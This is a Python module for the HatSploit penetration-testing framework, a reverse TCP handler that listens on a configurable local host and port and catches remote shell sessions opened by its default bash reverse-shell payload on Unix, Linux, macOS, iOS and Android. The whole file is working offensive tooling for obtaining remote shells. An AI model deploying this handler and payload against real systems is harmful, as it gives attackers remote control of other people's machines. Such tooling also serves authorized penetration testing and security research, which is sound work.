#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.handler import Handler


class HatSploitModule(Module, Handler):
    details = {
        'Name': "Reverse TCP Handler",
        'Module': "exploit/unix/handler/reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Reverse TCP Handler.",
        'Comments': [
            ''
        ],
        'Platform': "unix",
        'Risk': "high"
    }

    payload = {
        'Description': "Payload to use.",
        'Value': "unix/generic/bash_reverse_tcp",
        'Categories': None,
        'Architectures': None,
        'Platforms': [
            'unix',
            'linux',
            'macos',
            'iphoneos',
            'android'
        ],
        'Types': None
    }

    options = {
        'SRVHOST': {
            'Description': "Local host to listen on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Local port to listen on.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FOREVER': {
            'Description': "Start listener forever.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def run(self):
        server_host, server_port, forever = self.parse_options(self.options)

        if forever.lower() in ['yes', 'y']:
            while True:
                status = self.handle_session(
                    host=server_host,
                    port=server_port,

                    timeout=None,

                    payload=self.payload,
                    method="reverse_tcp"
                )

                if not status:
                    return
        else:
            self.handle_session(
                host=server_host,
                port=server_port,
                
                timeout=None,

                payload=self.payload,
                method="reverse_tcp"
            )
